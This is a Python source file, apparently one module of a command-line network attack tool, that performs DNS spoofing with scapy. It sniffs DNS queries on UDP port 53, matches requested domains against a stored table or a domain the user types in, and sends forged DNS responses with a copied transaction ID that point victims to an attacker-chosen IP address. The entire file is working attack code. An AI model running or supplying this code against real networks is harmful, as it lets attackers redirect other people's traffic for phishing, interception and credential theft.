"""This package contains everything related to DNS spoofing"""

import click
from functions.general import *
from functions.domains import *
from scapy.all import DNS, UDP, IP, DNSRR, DNSQR , sr1, send, sniff, sendp
from scapy.layers.l2 import Ether

interface = "udp port 53"

def spoof_dns_all():
    table = get_domains()
    click.echo("spoofing target using all stored domains")

    attack(table)


def spoof_dns_single():
    domain = click.prompt('Which domain do you want to spoof? Please enter the domain without www.')
    ip = click.prompt('Which IP should it route to?')

    attack({domain: ip})


def attack(table):
    while True:
        try:
            sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), count=30)
        except KeyboardInterrupt:
            break

    click.echo("Stopped attacking")


def analyze_packet(packet, table):
    print(packet[DNS])
    # check for proper DNS reqs only
    if not packet.haslayer(DNS) or not packet.haslayer(IP):
        return
    
    # filter out answers
    if packet[DNS].qr != 0:
        return
    
    query_name = get_packet_query_name(packet[DNS])
    
    if query_name in table:
        print(f'Found a query to spoof: {query_name}')
        spoof_packet(packet, query_name, table[query_name])
        return


def spoof_packet(packet, spoofed_domain, spoofed_ip):
    print(f"[SPOOFING]: Packet {packet.summary()}\n")
    print(f"\t[SPOOFING] Before: \n {packet.show()}")

    # Make DNS template message
    spoofed_reply = IP() / UDP() / DNS()

    # swap source/dest for UDP and IP layers
    spoofed_reply[IP].src = packet[IP].dst
    spoofed_reply[IP].dst = packet[IP].src
    spoofed_reply[UDP].sport = packet[UDP].dport
    spoofed_reply[UDP].dport = packet[UDP].sport

    # copy the TX ID
    spoofed_reply[DNS].id = packet[DNS].id
    spoofed_reply[DNS].qr = 1 # response (0 is request)
    spoofed_reply[DNS].aa = 0
    spoofed_reply[DNS].qd = packet[DNS].qd # pass the DNS Question Record to the resposne
    spoofed_reply[DNS].an = DNSRR(rrname=spoofed_domain+'.', rdata=spoofed_ip, type="A", rclass="IN")

    # print(spoofed_reply.summary())
    print(f"\t[SPOOFING] AFTER: \n\n  {spoofed_reply.show()}")

    send(spoofed_reply)


def get_packet_query_name(dns_packet):
    name = dns_packet.qd.qname[:-1].decode()
    
    # Remove "www." from the beginning of the name
    if name.startswith("www."):
        name = name[4:]

    return name